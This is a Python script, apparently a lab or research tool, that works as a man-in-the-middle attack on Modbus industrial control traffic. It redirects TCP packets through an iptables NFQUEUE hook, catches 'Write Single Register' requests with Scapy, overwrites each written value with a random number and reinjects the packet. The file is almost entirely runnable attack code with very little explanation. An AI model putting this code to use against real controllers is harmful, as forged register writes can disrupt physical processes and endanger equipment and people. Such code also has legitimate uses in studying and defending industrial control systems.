from netfilterqueue import NetfilterQueue as nfq
from scapy.all import *
from scapy.layers.inet import *
from scapy.utils import *
import scapy.contrib.modbus as mb
import re
import threading
import subprocess


import os

import random



write_status=0
pload2=[]

def packet_listener(packet):
    global write_status
    global pload2
    
    pl=IP(packet.get_payload())

    #print('source IP:',pl[IP].src)
    #print('Destination IP', pl[IP].dst)
    #print('raw:',bytes(pl))

    
    #if pl[IP].src == '192.168.0.50':  ## This is an attack that affects the register itself by changing the original value that was sent to write in the register. 
                                     ## We could do other attack that modify what the receiver  reads but the register itself is unchanged 
     
           
    
    if pl.haslayer("Write Single Register"): 
      write_status=1        
      
      print('Original payload is ',bytes(pl['Write Single Register']))
      pload2=list(bytes(pl['Write Single Register']))
      print('payload2 is ',dir(pl['Write Single Register']))
      pload2[-1]=random.randint(1, 10)
      #pl['Write Single Register'].remove_payload
      pl['Write Single Register'].raw_packet_cache=bytes(pload2)
      print('the new payload is ',bytes(pl['Write Single Register']))
      del pl[TCP].chksum
      del pl[IP].chksum
      packet.set_payload(bytes(pl))
      packet.drop()
    '''
    elif pl.haslayer("Write Single Register Response"):
      
      pl['Write Single Register Response'].raw_packet_cache=bytes(pload2)
      print('the new payload is ',bytes(pl['Write Single Register Response']))
      del pl[TCP].chksum
      del pl[IP].chksum
      packet.set_payload(bytes(pl))
      packet.drop()
      '''        
                     
    pl=IP(packet.get_payload())       
    pl.show()       
    send(pl)
    #packet.accept()
           
           
            
           

    #print('plllllllllllllllllllllllll')

    #pl.show()

    #print(packet)
    
    #packet.accept()
  
     
  
  
def __setdown():
  os.system("sudo iptables -t mangle -D PREROUTING -i wlan0 -p TCP -j NFQUEUE --queue-num 1") 
    

os.system("sudo iptables -t mangle -A PREROUTING -i wlan0 -p TCP -j NFQUEUE --queue-num 1")
os.system("sudo iptables -L")
queue = nfq()

queue.bind(1, packet_listener)



try:
  print("Starting Attack")
  
  queue.run()
except KeyboardInterrupt:
  __setdown()
  print("stopping sniffing")
  queue.unbind()